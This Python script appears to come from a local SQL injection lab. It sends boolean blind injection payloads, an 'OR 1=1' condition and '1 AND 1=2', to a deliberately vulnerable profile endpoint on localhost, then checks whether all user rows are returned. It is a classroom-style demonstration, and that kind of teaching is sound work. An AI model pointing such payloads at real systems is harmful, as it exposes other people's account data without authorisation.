"""
Attack #4 - Boolean Blind Injection
===================================
Sends an OR 1=1 payload to the vulnerable profile endpoint,
causing it to return all user rows instead of just one.
"""

import requests

from catalog import load_attack


PROFILE_URL = "http://127.0.0.1:5000/vulnerable/profile"


def test_payload(payload: str, description: str, expected: str) -> None:
    print(f"\n--- Payload: {payload!r} ({description}) ---")

    try:
        response = requests.get(PROFILE_URL, params={"id": payload}, timeout=5)
    except requests.RequestException as exc:
        print(f"[ERROR] Request failed: {exc}")
        return

    print(f"Status: {response.status_code}")

    found_users = []
    for username in ("admin", "alice", "bob", "charlie"):
        if username in response.text:
            found_users.append(username)

    print(f"Users visible in response: {len(found_users)} -> {', '.join(found_users) or 'none'}")

    if expected == "many" and len(found_users) > 1:
        print("[SUCCESS] Boolean blind injection worked - all users returned.")
    elif expected == "none" and len(found_users) == 0:
        print("[SUCCESS] False condition returned no rows as expected.")
    elif expected == "one" and len(found_users) == 1:
        print("[SUCCESS] Normal lookup returned exactly one user.")


def main() -> None:
    attack = load_attack(4)
    payloads = [
        (attack["payload"], "Configured attack payload", "many"),
        ("1 AND 1=2", "Always-false condition - should return no users", "none"),
        ("1", "Normal lookup - should return exactly one user", "one"),
    ]

    print(f"Target: {PROFILE_URL}")

    for payload, description, expected in payloads:
        test_payload(payload, description, expected)

    print("\n[DONE] Boolean blind injection test complete.")


if __name__ == "__main__":
    main()
